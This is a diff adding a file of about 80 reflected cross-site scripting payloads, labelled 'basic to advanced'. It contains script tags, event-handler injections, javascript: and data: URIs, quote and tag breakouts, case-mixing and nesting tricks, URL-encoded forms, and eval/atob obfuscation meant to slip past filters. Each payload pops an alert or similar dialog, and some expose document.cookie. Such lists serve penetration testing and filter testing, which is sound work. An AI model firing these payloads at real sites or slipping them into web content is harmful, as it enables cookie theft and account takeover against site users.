@@ -1,0 +1,82 @@
+# XSS Reflected Payloads — Basic to Advanced
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>window['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>frames['alert'](1)</script>
+<script>this['alert'](1)</script>
+<script>eval('alert(1)')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',1000)</script>
+<script>Function('alert(1)')()</script>
+<script>new Function('alert(1)')()</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>window.onerror=alert;throw 1</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img/src=x onerror=alert(1)>
+<img src onerror=alert(1)>
+<img src=x onerror=alert(document.domain)>
+<img src=1 onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload="alert(1)">
+<svg onload=alert(document.domain)>
+<svg><script>alert(1)</script></svg>
+<body onload=alert(1)>
+<body/onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<meter onmouseover=alert(1)>0</meter>
+<div onmouseover=alert(1)>hover</div>
+<a href="javascript:alert(1)">click</a>
+<a href="javascript:alert(document.domain)">X</a>
+<a href=javascript:alert(1)>X</a>
+<a href="data:text/html,<script>alert(1)</script>">X</a>
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe onload=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<form action="javascript:alert(1)"><input type=submit>
+<isindex action="javascript:alert(1)" type=image>
+<math><mtext><table><mglyph><svg xmlns="http://www.w3.org/2000/svg"><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg></mglyph></table></mtext></math>
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+</script><script>alert(1)</script>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+--><script>alert(1)</script>
+--!><script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<SCRIPT>alert(1)</SCRIPT>
+<script x>alert(1)</script>
+<script>alert(1)//
+<script>alert(1)<!--
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Csvg%20onload%3Dalert(1)%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributename=x to=1>
